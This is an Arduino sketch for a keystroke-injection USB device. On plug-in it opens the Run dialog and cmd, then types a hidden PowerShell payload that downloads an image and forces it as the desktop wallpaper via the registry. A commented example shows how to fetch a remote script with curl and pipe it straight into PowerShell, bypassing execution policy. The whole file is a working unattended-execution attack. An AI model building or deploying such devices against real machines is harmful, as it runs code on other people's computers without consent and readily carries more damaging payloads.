#include <Keyboard.h>
#include "AzertyKeyboard.h"

String payload()
{
  String payload;
  // launch powershell in the background
  payload += "powershell.exe -windowstyle hidden Invoke-Command -ScriptBlock {";
  
  // exemple to download a powershell script and running it (without script execution allow in Execution Policy)
  // payload = "C:\\Windows\\System32\\curl.exe http://127.0.0.1:8080/script.txt | powershell";

  // exemple to change the current wallpaper  
  payload += "cd C:/Users/Public;"; 
  payload += "iwr https://i.redd.it/c2aoeavyslo61.jpg -o img.jpg;";
  payload += "reg add \'HKEY_CURRENT_USER\\Control Panel\\Desktop\' /v Wallpaper /t REG_SZ /d C:/Users/public/img.jpg /f;";
  // spam this command to force the update of the wallpaper
  // if not used, the changes will take place at reboot
  payload += "for ($i=0;$i -lt 10; $i++) {RUNDLL32.EXE USER32.DLL, UpdatePerUserSystemParameters , 1 , True}";
  payload += "exit";

  payload += "}";

  return payload;
}

void setup()
{

  Keyboard.begin();

  //delay for debugging and safety
  delay(1000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);
  
  KeyboardPrint("cmd"); //cmd launch faster than powershell
  delay(300);
  pressKey(KEY_RETURN);

  delay(500);  
  
  KeyboardPrint(payload());
  
  delay(300);
  pressKey(KEY_RETURN);

  delay(500);

  Keyboard.end();
}

// be careful if using the loop
void loop() {}
